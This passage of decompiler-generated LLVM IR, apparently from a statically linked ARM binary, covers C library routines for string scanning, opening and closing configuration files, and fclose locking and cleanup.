dec_label_pc_1537c:                               ; preds = %.dec_label_pc_1537c_crit_edge, %dec_label_pc_15368
  %v0_1537c = phi i32 [ %v0_1537c.pre, %.dec_label_pc_1537c_crit_edge ], [ %v3_15368, %dec_label_pc_15368 ]
  %v2_1537c = icmp eq i32 %v0_1537c, 0
  store i1 %v2_1537c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1537c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_1537c
  %v1_15380 = load i32, i32* @fp, align 4
  %v2_15380 = trunc i32 %v1_15380 to i8
  %v3_15380 = load i32, i32* @r4, align 4
  %v4_15380 = inttoptr i32 %v3_15380 to i8*
  store i8 %v2_15380, i8* %v4_15380, align 1
  %v5_15380 = load i32, i32* @r4, align 4
  %v6_15380 = add i32 %v5_15380, 1
  store i32 %v6_15380, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_1537c, %bb70
  %v2_15384 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15384, i32* %r3.global-to-local, align 4
  %v2_15388 = icmp eq i32 %v2_15384, 0
  store i1 %v2_15388, i1* %cpsr_z.global-to-local, align 1
  %v0_153a4.pre = load i32, i32* @r4, align 4
  br i1 %v2_15388, label %dec_label_pc_153a0, label %dec_label_pc_15390

dec_label_pc_15390:                               ; preds = %bb71
  store i32 %v0_153a4.pre, i32* @r0, align 4
  %v0_15394 = load i32, i32* @sl, align 4
  %v2_15398 = inttoptr i32 %v0_153a4.pre to i8*
  %v3_15398 = call i32 @__GI_strspn(i8* %v2_15398, i32 %v0_15394)
  store i32 %v3_15398, i32* %r0.global-to-local, align 4
  %v0_1539c = load i32, i32* @r4, align 4
  %v2_1539c = add i32 %v0_1539c, %v3_15398
  store i32 %v2_1539c, i32* @r4, align 4
  br label %dec_label_pc_153a0

dec_label_pc_153a0:                               ; preds = %bb71, %dec_label_pc_15390
  %v0_153a4 = phi i32 [ %v2_1539c, %dec_label_pc_15390 ], [ %v0_153a4.pre, %bb71 ]
  %v0_153a0 = load i32, i32* @r6, align 4
  %v1_153a0 = add i32 %v0_153a0, 1
  store i32 %v1_153a0, i32* @r6, align 4
  %v1_153a4 = inttoptr i32 %v0_153a4 to i8*
  %v2_153a4 = load i8, i8* %v1_153a4, align 1
  %v3_153a4 = zext i8 %v2_153a4 to i32
  store i32 %v3_153a4, i32* %r2.global-to-local, align 4
  %v2_153a8 = icmp eq i8 %v2_153a4, 0
  store i1 %v2_153a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153a8, label %dec_label_pc_153c0, label %dec_label_pc_153b0

dec_label_pc_153b0:                               ; preds = %dec_label_pc_152cc, %dec_label_pc_153a0
  %v0_152fc = phi i32 [ %v0_153a4, %dec_label_pc_153a0 ], [ %v0_153a412, %dec_label_pc_152cc ]
  %v2_152fc = phi i32 [ %v1_153a0, %dec_label_pc_153a0 ], [ %v0_152e4, %dec_label_pc_152cc ]
  %v1_153b4 = phi i32 [ %v3_153a4, %dec_label_pc_153a0 ], [ %v3_153a415, %dec_label_pc_152cc ]
  %v0_153b0 = load i32, i32* @r7, align 4
  %v1_153b0 = inttoptr i32 %v0_153b0 to i8*
  %v2_153b0 = load i8, i8* %v1_153b0, align 1
  %v3_153b0 = zext i8 %v2_153b0 to i32
  store i32 %v3_153b0, i32* %r3.global-to-local, align 4
  %v9_153b4 = icmp eq i32 %v3_153b0, %v1_153b4
  store i1 %v9_153b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_153b4, label %dec_label_pc_153c0, label %bb72

bb72:                                             ; preds = %dec_label_pc_153b0
  %v2_153b8 = load i32, i32* @sb, align 4
  %v3_153b8 = sub i32 %v2_152fc, %v2_153b8
  %v5_153b8 = xor i32 %v2_153b8, %v2_152fc
  %v6_153b8 = xor i32 %v3_153b8, %v2_152fc
  %v7_153b8 = and i32 %v6_153b8, %v5_153b8
  %v8_153b8 = icmp slt i32 %v7_153b8, 0
  %v9_153b8 = icmp slt i32 %v3_153b8, 0
  %v10_153b8 = icmp eq i32 %v2_152fc, %v2_153b8
  store i1 %v10_153b8, i1* %cpsr_z.global-to-local, align 1
  %v2_153bc = xor i1 %v9_153b8, %v8_153b8
  br i1 %v2_153bc, label %dec_label_pc_152ec, label %dec_label_pc_153c0

dec_label_pc_153c0:                               ; preds = %dec_label_pc_153b0, %dec_label_pc_153a0, %bb72, %dec_label_pc_152cc
  %v0_153c4 = phi i32 [ %v0_152e4, %dec_label_pc_152cc ], [ %v2_152fc, %dec_label_pc_153b0 ], [ %v1_153a0, %dec_label_pc_153a0 ], [ %v2_152fc, %bb72 ]
  store i32 %v3_150e4, i32* %r2.global-to-local, align 4
  %v9_153c4 = icmp eq i32 %v0_153c4, %v3_150e4
  store i1 %v9_153c4, i1* %cpsr_z.global-to-local, align 1
  %v6_153c8 = icmp slt i32 %v0_153c4, %v3_150e4
  br i1 %v6_153c8, label %dec_label_pc_153cc, label %dec_label_pc_153d8

dec_label_pc_153cc:                               ; preds = %dec_label_pc_153c0
  %v0_153cc = load i32, i32* @r8, align 4
  %v1_153cc = and i32 %v0_153cc, 1048576
  %v2_153cc = icmp eq i32 %v1_153cc, 0
  store i1 %v2_153cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153cc, label %dec_label_pc_15124.backedge, label %dec_label_pc_153d4

dec_label_pc_153d4:                               ; preds = %dec_label_pc_153cc, %dec_label_pc_1528c, %.thread, %entry
  br label %dec_label_pc_153d8

dec_label_pc_153d8:                               ; preds = %dec_label_pc_153c0, %dec_label_pc_151a8, %dec_label_pc_153d4
  %v0_153d8 = phi i32 [ %v0_151b8, %dec_label_pc_151a8 ], [ 0, %dec_label_pc_153d4 ], [ %v0_153c4, %dec_label_pc_153c0 ]
  store i32 %v0_153d8, i32* %r0.global-to-local, align 4
  store i32 %v3_150c0, i32* @r4, align 4
  store i32 %v6_150c0, i32* @r5, align 4
  store i32 %v9_150c0, i32* @r6, align 4
  store i32 %v12_150c0, i32* @r7, align 4
  store i32 %v15_150c0, i32* @r8, align 4
  store i32 %v18_150c0, i32* @sb, align 4
  store i32 %v21_150c0, i32* @sl, align 4
  store i32 %v24_150c0, i32* @fp, align 4
  ret i32 %v0_153d8

; uselistorder directives
  uselistorder i32 %v0_153d8, { 1, 0 }
  uselistorder i32 %v0_153c4, { 0, 2, 1 }
  uselistorder i32 %v3_153b8, { 1, 0 }
  uselistorder i32 %v2_153b8, { 1, 0, 2 }
  uselistorder i32 %v2_152fc, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_153a4.pre, { 0, 2, 1 }
  uselistorder i32 %v5_15338, { 1, 0, 2, 3 }
  uselistorder i32 %v0_152e4, { 1, 0, 2 }
  uselistorder i1 %v9_152c4, { 1, 0 }
  uselistorder i32 %v3_1529c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1528c, { 1, 0 }
  uselistorder i1 %v8_15284, { 1, 0 }
  uselistorder i32 %v3_15254, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_15244, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_1522c, { 1, 0, 2 }
  uselistorder i32 %v1_1521c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15208, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15200, { 1, 0 }
  uselistorder i32 %v1_151ec, { 1, 0 }
  uselistorder i32 %v1_151e8, { 1, 0 }
  uselistorder i32 %v2_151c4, { 1, 0 }
  uselistorder i32 %v1_151a8, { 2, 0, 1 }
  uselistorder i32 %v0_15190, { 1, 0 }
  uselistorder i32 %v1_15180, { 0, 2, 1 }
  uselistorder i32* %v1_152f0, { 1, 0 }
  uselistorder i1 %v2_15298, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1510c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_15100, { 2, 1, 0 }
  uselistorder i32 %v3_150e8, { 1, 2, 0 }
  uselistorder i32 %v3_150e4, { 2, 1, 0 }
  uselistorder i32 %v1_150dc, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_153d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_153c0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_153b0, { 1, 0 }
  uselistorder label %dec_label_pc_153a0, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15354, { 1, 0 }
  uselistorder label %dec_label_pc_15124.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_152b4, { 1, 0 }
  uselistorder label %dec_label_pc_1528c, { 1, 0 }
  uselistorder label %dec_label_pc_15280, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15244, { 1, 0 }
  uselistorder label %dec_label_pc_15178, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_153ec = icmp eq i32* %arg1, null
  br i1 %v2_153ec, label %dec_label_pc_15414, label %dec_label_pc_153f4

dec_label_pc_153f4:                               ; preds = %entry
  %v2_153f4 = load i32, i32* %arg1, align 4
  %v1_153f8 = inttoptr i32 %v2_153f4 to i16*
  %v2_153f8 = call i32 @__GI_fclose(i16* %v1_153f8)
  %v0_153fc = load i32, i32* @r4, align 4
  %v1_153fc = add i32 %v0_153fc, 20
  %v2_153fc = inttoptr i32 %v1_153fc to i32*
  %v3_153fc = load i32, i32* %v2_153fc, align 4
  %v2_15400 = icmp eq i32 %v3_153fc, 0
  br i1 %v2_15400, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_153f4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_153f4, %bb
  store i32 87052, i32* @lr, align 4
  %v1_15408 = xor i1 %v2_15400, true
  call void @__pseudo_cond_branch(i1 %v1_15408, i32 ptrtoint (i32* @global_var_12ad4.31 to i32))
  %v0_1540c = load i32, i32* @r4, align 4
  store i32 %v0_1540c, i32* @r0, align 4
  %v0_15410 = call i32 @free()
  br label %dec_label_pc_15414

dec_label_pc_15414:                               ; preds = %entry, %bb6
  %v1_15418 = phi i32 [ 0, %entry ], [ %v0_15410, %bb6 ]
  ret i32 %v1_15418

; uselistorder directives
  uselistorder label %dec_label_pc_15414, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15428 = load i32, i32* @r4, align 4
  store i32 %v3_15428, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 -33972), i32* @r1, align 4
  %v0_15430 = call i32 @__GI_fopen()
  store i32 %v0_15430, i32* %r0.global-to-local, align 4
  store i32 %v0_15430, i32* @r4, align 4
  %v2_15434 = icmp eq i32 %v0_15430, 0
  br i1 %v2_15434, label %bb, label %dec_label_pc_15440

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_15440:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_15448 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_15448, i32* %r0.global-to-local, align 4
  %v2_1544c = icmp eq i32 %v2_15448, 0
  br i1 %v2_1544c, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_15440
  %v1_15450 = load i32, i32* @r4, align 4
  %v3_15450 = inttoptr i32 %v2_15448 to i32*
  store i32 %v1_15450, i32* %v3_15450, align 4
  %v1_15458.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_15440, %bb4
  %v1_15458 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_15440 ], [ %v1_15458.pre, %bb4 ]
  %v2_15454 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15454, i32* @r4, align 4
  ret i32 %v1_15458

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 40, 38, 39, 37, 36, 35, 34, 33, 32, 1, 0, 31, 30, 29, 28, 27, 26, 2, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15464 = load i32, i32* @r4, align 4
  store i32 %v3_15464, i32* %stack_var_-36, align 4
  %v6_15464 = load i32, i32* @r5, align 4
  %v9_15464 = load i32, i32* @r6, align 4
  %v12_15464 = load i32, i32* @r7, align 4
  %v2_15468 = add i32 %tmp, 52
  %v3_15468 = inttoptr i32 %v2_15468 to i32*
  %v4_15468 = load i32, i32* %v3_15468, align 4
  store i32 %v4_15468, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15470 = icmp eq i32 %v4_15468, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r8, align 4
  br i1 %v2_15470, label %dec_label_pc_15484, label %dec_label_pc_154e8

dec_label_pc_15484:                               ; preds = %entry
  %v0_15484 = call i32 @__aeabi_read_tp()
  store i32 %v0_15484, i32* %r0.global-to-local, align 4
  %v0_15488 = load i32, i32* @r5, align 4
  %v1_15488 = add i32 %v0_15488, 64
  %v2_15488 = inttoptr i32 %v1_15488 to i32*
  %v3_15488 = load i32, i32* %v2_15488, align 4
  store i32 %v3_15488, i32* %r3.global-to-local, align 4
  %v1_1548c = add i32 %v0_15484, -1168
  store i32 %v1_1548c, i32* @r6, align 4
  %v3_15490 = icmp uge i32 %v3_15488, %v1_1548c
  store i1 %v3_15490, i1* %cpsr_c.global-to-local, align 1
  %v9_15490 = icmp eq i32 %v3_15488, %v1_1548c
  br i1 %v9_15490, label %dec_label_pc_154dc, label %dec_label_pc_15498

dec_label_pc_15498:                               ; preds = %dec_label_pc_15484
  %v1_15498 = add i32 %v0_15488, 56
  store i32 %v1_15498, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_15498, i32* %r2.global-to-local, align 4
  %v0_154a4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_154a4, i32* @r4, align 4
  %v1_154a8115 = inttoptr i32 %v1_15498 to i32*
  %v2_154a8116 = load i32, i32* %v1_154a8115, align 4
  store i32 %v2_154a8116, i32* %r3.global-to-local, align 4
  %v3_154ac118 = icmp uge i32 %v2_154a8116, %v0_154a4
  store i1 %v3_154ac118, i1* %cpsr_c.global-to-local, align 1
  %v9_154ac124 = icmp eq i32 %v2_154a8116, %v0_154a4
  br i1 %v9_154ac124, label %dec_label_pc_154b4, label %dec_label_pc_154cc

dec_label_pc_154b4:                               ; preds = %dec_label_pc_15498, %dec_label_pc_154b4.dec_label_pc_154a8_crit_edge
  %v0_154b4125 = phi i32 [ %v1_154ac.pre, %dec_label_pc_154b4.dec_label_pc_154a8_crit_edge ], [ %v0_154a4, %dec_label_pc_15498 ]
  store i32 %v0_154b4125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_154c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_154c4, label %dec_label_pc_154c8, label %dec_label_pc_154b4.dec_label_pc_154a8_crit_edge

dec_label_pc_154b4.dec_label_pc_154a8_crit_edge:  ; preds = %dec_label_pc_154b4
  %v0_154a8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_154ac.pre = load i32, i32* @r4, align 4
  %v1_154a8 = inttoptr i32 %v0_154a8.pre to i32*
  %v2_154a8 = load i32, i32* %v1_154a8, align 4
  store i32 %v2_154a8, i32* %r3.global-to-local, align 4
  %v3_154ac = icmp uge i32 %v2_154a8, %v1_154ac.pre
  store i1 %v3_154ac, i1* %cpsr_c.global-to-local, align 1
  %v9_154ac = icmp eq i32 %v2_154a8, %v1_154ac.pre
  br i1 %v9_154ac, label %dec_label_pc_154b4, label %dec_label_pc_154cc

dec_label_pc_154c8:                               ; preds = %dec_label_pc_154b4
  %v0_154c8 = load i32, i32* @r4, align 4
  store i32 %v0_154c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_154cc

dec_label_pc_154cc:                               ; preds = %dec_label_pc_15498, %dec_label_pc_154b4.dec_label_pc_154a8_crit_edge, %dec_label_pc_154c8
  %v0_154cc = phi i32 [ %v0_154c8, %dec_label_pc_154c8 ], [ %v2_154a8116, %dec_label_pc_15498 ], [ %v2_154a8, %dec_label_pc_154b4.dec_label_pc_154a8_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_154cc = icmp eq i32 %v0_154cc, 0
  br i1 %v2_154cc, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_154cc
  %v1_154d0 = load i32, i32* @r7, align 4
  store i32 %v1_154d0, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_154cc, %bb
  %v1_154d4 = xor i1 %v2_154cc, true
  call void @__pseudo_cond_branch(i1 %v1_154d4, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_154d8 = load i32, i32* @r6, align 4
  %v1_154d8 = load i32, i32* @r5, align 4
  %v2_154d8 = add i32 %v1_154d8, 64
  %v3_154d8 = inttoptr i32 %v2_154d8 to i32*
  store i32 %v0_154d8, i32* %v3_154d8, align 4
  %v0_154dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_154dc

dec_label_pc_154dc:                               ; preds = %dec_label_pc_15484, %bb41
  %v0_154dc = phi i32 [ %v0_15488, %dec_label_pc_15484 ], [ %v0_154dc.pre, %bb41 ]
  %v1_154dc = add i32 %v0_154dc, 60
  %v2_154dc = inttoptr i32 %v1_154dc to i32*
  %v3_154dc = load i32, i32* %v2_154dc, align 4
  %v1_154e0 = add i32 %v3_154dc, 1
  store i32 %v1_154e0, i32* %r3.global-to-local, align 4
  store i32 %v1_154e0, i32* %v2_154dc, align 4
  %v0_154e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_154e8

dec_label_pc_154e8:                               ; preds = %entry, %dec_label_pc_154dc
  %v1_154f0 = phi i32 [ %tmp, %entry ], [ %v0_154e8.pre, %dec_label_pc_154dc ]
  %v1_154e8 = inttoptr i32 %v1_154f0 to i16*
  %v2_154e8 = load i16, i16* %v1_154e8, align 2
  %v3_154e8 = zext i16 %v2_154e8 to i32
  store i32 %v3_154e8, i32* %r3.global-to-local, align 4
  %v1_154ec = and i32 %v3_154e8, 64
  %v2_154ec = icmp eq i32 %v1_154ec, 0
  br i1 %v2_154ec, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_154e8
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_154e8, %bb42
  %storemerge = phi i32 [ %v1_154f0, %bb42 ], [ %v1_154ec, %dec_label_pc_154e8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 87288, i32* @lr, align 4
  %v1_154f4 = xor i1 %v2_154ec, true
  call void @__pseudo_cond_branch(i1 %v1_154f4, i32 ptrtoint (i32* @global_var_16338.560 to i32))
  %v0_154f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_154f8, i32* %fp.global-to-local, align 4
  %v0_154fc = load i32, i32* @r5, align 4
  %v1_154fc = add i32 %v0_154fc, 4
  %v2_154fc = inttoptr i32 %v1_154fc to i32*
  %v3_154fc = load i32, i32* %v2_154fc, align 4
  store i32 %v3_154fc, i32* %r0.global-to-local, align 4
  %v1_15500 = call i32 @__GI___libc_close(i32 %v3_154fc)
  store i32 %v1_15500, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15508 = load i32, i32* @r8, align 4
  %v2_15508 = add i32 %v0_15508, 160
  %v3_15508 = inttoptr i32 %v2_15508 to i32*
  %v4_15508 = load i32, i32* %v3_15508, align 4
  store i32 %v4_15508, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1550c = icmp slt i32 %v1_15500, 0
  br i1 %v1_1550c, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_15514 = add i32 %v4_15508, 8
  %v2_15514 = inttoptr i32 %v1_15514 to i32*
  %v3_15514 = load i32, i32* %v2_15514, align 4
  store i32 %v3_15514, i32* %r3.global-to-local, align 4
  %v0_15518 = call i32 @__aeabi_read_tp()
  store i32 %v0_15518, i32* %r0.global-to-local, align 4
  %v1_1551c = add i32 %v0_15518, -1168
  store i32 %v1_1551c, i32* %sl.global-to-local, align 4
  %v0_15520 = load i32, i32* %r3.global-to-local, align 4
  %v3_15520 = icmp uge i32 %v0_15520, %v1_1551c
  store i1 %v3_15520, i1* %cpsr_c.global-to-local, align 1
  %v9_15520 = icmp eq i32 %v0_15520, %v1_1551c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_15528 = load i32, i32* @r5, align 4
  %v2_15528 = add i32 %v1_15528, 4
  %v3_15528 = inttoptr i32 %v2_15528 to i32*
  store i32 -1, i32* %v3_15528, align 4
  br i1 %v9_15520, label %dec_label_pc_15570, label %dec_label_pc_15530

dec_label_pc_15530:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_15534 = load i32, i32* @r7, align 4
  store i32 %v0_15534, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1553c108 = inttoptr i32 %v0_15534 to i32*
  %v2_1553c109 = load i32, i32* %v1_1553c108, align 4
  store i32 %v2_1553c109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15540111 = icmp eq i32 %v2_1553c109, 0
  br i1 %v9_15540111, label %dec_label_pc_15548, label %dec_label_pc_15560

dec_label_pc_15548:                               ; preds = %dec_label_pc_15530, %dec_label_pc_15548.dec_label_pc_1553c_crit_edge
  %v0_15548112 = phi i32 [ %v1_15540.pre, %dec_label_pc_15548.dec_label_pc_1553c_crit_edge ], [ 0, %dec_label_pc_15530 ]
  store i32 %v0_15548112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15558 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15558, label %dec_label_pc_1555c, label %dec_label_pc_15548.dec_label_pc_1553c_crit_edge

dec_label_pc_15548.dec_label_pc_1553c_crit_edge:  ; preds = %dec_label_pc_15548
  %v0_1553c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15540.pre = load i32, i32* @r4, align 4
  %v1_1553c = inttoptr i32 %v0_1553c.pre to i32*
  %v2_1553c = load i32, i32* %v1_1553c, align 4
  store i32 %v2_1553c, i32* %r3.global-to-local, align 4
  %v3_15540 = icmp uge i32 %v2_1553c, %v1_15540.pre
  store i1 %v3_15540, i1* %cpsr_c.global-to-local, align 1
  %v9_15540 = icmp eq i32 %v2_1553c, %v1_15540.pre
  br i1 %v9_15540, label %dec_label_pc_15548, label %dec_label_pc_15560

dec_label_pc_1555c:                               ; preds = %dec_label_pc_15548
  %v0_1555c = load i32, i32* @r4, align 4
  store i32 %v0_1555c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15560

dec_label_pc_15560:                               ; preds = %dec_label_pc_15530, %dec_label_pc_15548.dec_label_pc_1553c_crit_edge, %dec_label_pc_1555c
  %v0_15560 = phi i32 [ %v0_1555c, %dec_label_pc_1555c ], [ %v2_1553c109, %dec_label_pc_15530 ], [ %v2_1553c, %dec_label_pc_15548.dec_label_pc_1553c_crit_edge ]
  %v1_15560 = phi i32 [ %v0_1555c, %dec_label_pc_1555c ], [ 0, %dec_label_pc_15530 ], [ %v1_15540.pre, %dec_label_pc_15548.dec_label_pc_1553c_crit_edge ]
  %v3_15560 = icmp uge i32 %v0_15560, %v1_15560
  store i1 %v3_15560, i1* %cpsr_c.global-to-local, align 1
  %v9_15560 = icmp eq i32 %v0_15560, %v1_15560
  br i1 %v9_15560, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_15560
  %v1_15564 = load i32, i32* @r7, align 4
  store i32 %v1_15564, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_15560, %bb46
  %v1_15568 = xor i1 %v9_15560, true
  call void @__pseudo_cond_branch(i1 %v1_15568, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_1556c = load i32, i32* %sl.global-to-local, align 4
  %v1_1556c = load i32, i32* @r7, align 4
  %v2_1556c = add i32 %v1_1556c, 8
  %v3_1556c = inttoptr i32 %v2_1556c to i32*
  store i32 %v0_1556c, i32* %v3_1556c, align 4
  br label %dec_label_pc_15570

dec_label_pc_15570:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15574 = load i32, i32* @r8, align 4
  %v2_15574 = add i32 %v0_15574, 160
  %v3_15574 = inttoptr i32 %v2_15574 to i32*
  %v4_15574 = load i32, i32* %v3_15574, align 4
  store i32 %v4_15574, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1557c = add i32 %v0_15574, 12
  %v3_1557c = inttoptr i32 %v2_1557c to i32*
  %v4_1557c = load i32, i32* %v3_1557c, align 4
  store i32 %v4_1557c, i32* %r2.global-to-local, align 4
  %v1_15580 = add i32 %v4_15574, 4
  %v2_15580 = inttoptr i32 %v1_15580 to i32*
  %v3_15580 = load i32, i32* %v2_15580, align 4
  store i32 %v3_15580, i32* %r1.global-to-local, align 4
  %v1_15584 = inttoptr i32 %v4_1557c to i32*
  %v2_15584 = load i32, i32* %v1_15584, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15588 = icmp eq i32 %v3_15580, 0
  %v1_1558c = add i32 %v2_15584, 1
  store i32 %v1_1558c, i32* %r3.global-to-local, align 4
  store i32 %v1_1558c, i32* %v1_15584, align 4
  br i1 %v2_15588, label %dec_label_pc_15598, label %dec_label_pc_155f8

dec_label_pc_15598:                               ; preds = %dec_label_pc_15570
  %v0_15598 = load i32, i32* %r1.global-to-local, align 4
  %v1_15598 = load i32, i32* %r0.global-to-local, align 4
  %v2_15598 = add i32 %v1_15598, 8
  %v3_15598 = inttoptr i32 %v2_15598 to i32*
  store i32 %v0_15598, i32* %v3_15598, align 4
  %v0_1559c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1559c, i32* @r7, align 4
  br label %dec_label_pc_155a0

dec_label_pc_155a0:                               ; preds = %dec_label_pc_155d0.dec_label_pc_155a0_crit_edge, %dec_label_pc_15598
  %v0_155a0 = phi i32 [ %v0_155a0.pre, %dec_label_pc_155d0.dec_label_pc_155a0_crit_edge ], [ %v0_1559c, %dec_label_pc_15598 ]
  %v1_155a0 = inttoptr i32 %v0_155a0 to i32*
  %v2_155a0 = load i32, i32* %v1_155a0, align 4
  store i32 %v2_155a0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_155a0, i32* %r2.global-to-local, align 4
  %v2_155ac96 = load i32, i32* %v1_155a0, align 4
  store i32 %v2_155ac96, i32* %r3.global-to-local, align 4
  %v3_155b098 = icmp uge i32 %v2_155ac96, %v2_155a0
  store i1 %v3_155b098, i1* %cpsr_c.global-to-local, align 1
  %v9_155b0104 = icmp eq i32 %v2_155ac96, %v2_155a0
  br i1 %v9_155b0104, label %dec_label_pc_155b8, label %dec_label_pc_155d0

dec_label_pc_155b8:                               ; preds = %dec_label_pc_155a0, %dec_label_pc_155b8.dec_label_pc_155ac_crit_edge
  %v0_155b8105 = phi i32 [ %v1_155b0.pre, %dec_label_pc_155b8.dec_label_pc_155ac_crit_edge ], [ %v2_155a0, %dec_label_pc_155a0 ]
  store i32 %v0_155b8105, i32* %r0.global-to-local, align 4
